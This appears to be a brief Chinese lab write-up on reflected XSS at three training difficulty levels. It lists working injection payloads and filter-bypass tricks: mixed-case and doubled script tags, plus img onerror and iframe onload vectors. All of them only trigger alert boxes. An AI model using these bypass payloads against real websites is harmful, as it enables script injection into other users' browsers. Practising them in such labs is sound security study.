# XSS (Reflected)

> ## low

最简单的xss

```html
<script>alert('low')</script>
```

<br>

> ## medium

1.使用大小写绕过：

```html
<ScRipt>alert('medium1');</ScRipt>
```



2.使用双写绕过：

```html
<scr<script>ipt>alert('medium2');</script>
```



3.使用非 script 标签

img标签：

```html
<img src=1 onerror=alert('medium3')>
```

iframe标签：

```html
<iframe onload=alert('medium4')>
```

<br>

> ## high
>

使用非 script 标签注入

img标签：

```html
<img src=1 onerror=alert('high1')>
```

iframe标签：

```html
<iframe onload=alert('high2')>
```

<br>



更多方法待补充